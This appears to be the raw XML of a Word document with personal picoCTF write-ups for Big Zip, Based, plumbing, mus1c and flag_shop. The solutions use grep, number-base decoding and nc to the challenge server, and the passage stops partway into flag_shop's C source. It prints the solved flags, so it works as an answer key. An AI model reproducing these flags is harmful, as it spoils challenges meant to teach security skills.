      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>Big Zip</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20B38679" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="223A96FE" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CBF493E" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: LT '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>syreal</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>' Jones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1169A77E" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D4B49B1" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Unzip this archive and find the flag. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C56D8A0" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="707"/>
        </w:tabs>
      </w:pPr>
      <w:hyperlink r:id="rId39" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>Download zip file</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AC15D59" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>caro@ubuntu</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">:~/Downloads/files/big-zip-files$ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>grep -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>ri</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>{" ./</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4726F679" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>./folder_pmbymkjcya/folder_cawigcwvgv/folder_ltdayfmktr/folder_fnpfclfyee/whzxrpivpqld.txt:information on the record will last a billion years. Genes and brains and books encode</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>{gr3p_15_m4g1c_ef8790dc}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CCA6350" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B50C85C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>grep -r recursive   -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> ignore case </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25233229" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52482656" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Based</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34F38A1C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 200 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E0617FB" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AD2E0C8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Author: Alex Fulton/Daniel </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Tunitis</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="17064861" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67135E0B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To get truly 1337, you must understand different data encodings, such as hexadecimal or binary. Can you get the flag from this program to prove you are on the way to becoming 1337? Connect with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>nc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve"> jupiter.challenges.picoctf.org 29221</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D0BBDA9"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29221</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7677EB49" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Let us see how data is stored</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="718A4920" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>lime</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61244955" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Please give the 01101100 01101001 01101101 01100101 as a word.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="481E33B2" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49B20A22" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>you have 45 seconds.....</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E3B855B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C77C714" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Input:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A1D2DFE" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>lime</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C7A6069" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Please give me the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> 163 164 162 145 145 164</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as a word.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DD16ECB" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Input:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="369422A3" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>street</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C01863A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Please give me the 636f6d7075746572 as a word.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1187560F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Input:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FFD4203" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>computer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01DA284A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>You've beaten the challenge</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29483F07" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Flag: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>{learning_about_converting_values_00a975ff}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53A6C676" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40188252" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>octal  :</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>163 164 162 145 145 164</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="074C5B62" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>plumbing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="175A7F0B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 200 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05C88491" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="789271A9" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Author: Alex Fulton/Danny </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Tunitis</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="251F4912" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C4307F0" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Sometimes you need to handle process data outside of a file. Can you find a way to keep the output from this program and search for the flag? Connect to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>jupiter.challenges.picoctf.org 7480</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72945834" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">$ </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>nc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> jupiter.challenges.picoctf.org 7480 &gt;result</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4008B0D0" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>caro@ubuntu</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>:~/Downloads$ cat result | grep '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>pico</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2873E106" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>{digital_plumb3r_06e9d954}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="008C6545" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2515C37D"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7480 |</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>grep '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>pico</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EF94776" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>{digital_plumb3r_06e9d954}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C374FEC" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>mus1c</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0101EF00" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 300 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="423A7372" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="576BA8D7" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: Danny</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58392FE6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24EF64B2" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">I wrote you a </w:t>
      </w:r>
      <w:hyperlink r:id="rId40" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>song</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve">. Put it in the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>{} flag format.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EF6C7D9" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Hint: Are you good at rockstar</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C5D98BD" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Google  rockstar</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DB95A63" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:hyperlink>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>https://codewithrockstar.com/online</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6ACD45A1" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5FF51E22" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="0" distR="0" simplePos="0" relativeHeight="3" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="77B78C16" wp14:editId="57862785">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>37465</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>452755</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5000625" cy="45339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1"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5000625" cy="4533900"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5991E6E0" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D530820" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="056B8AEC" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="09BD244E" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>{rrrocknrn0113r}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38266A07" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>convert ascii to characters</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34BE5008" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>flag_shop</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="0411134F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 300 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E1E6D5B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1056039E" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: Danny</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ED589C8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71139F23" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">There's a flag shop selling stuff, can you buy a flag? </w:t>
      </w:r>
      <w:hyperlink r:id="rId42" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>Source</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve">. Connect with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>nc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve"> jupiter.challenges.picoctf.org 4906</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18CCE79F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07DE7371" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7BFF5DC2" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Solve</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EBCE606" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Open up the source, and we see that the service is a simple store. It offers us 3 options, but the one we're interested in is the second one.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FD1221B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The second one offers fake flags and the real flag. Of course, the real flag costs </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>100000</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> dollars, and we only start with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>1100</w:t>
      </w:r>
      <w:r>
        <w:t>. So how in the world do we get more money? Let's look at the fake flags.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15167347" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>if(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>auction_choice</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve"> == 1){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19511BE0"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("These knockoff Flags cost 900 each, enter desired quantity\n");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57A712E0" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    int </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>number_flags</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve"> = 0;</w:t>
      </w:r>
    </w:p>
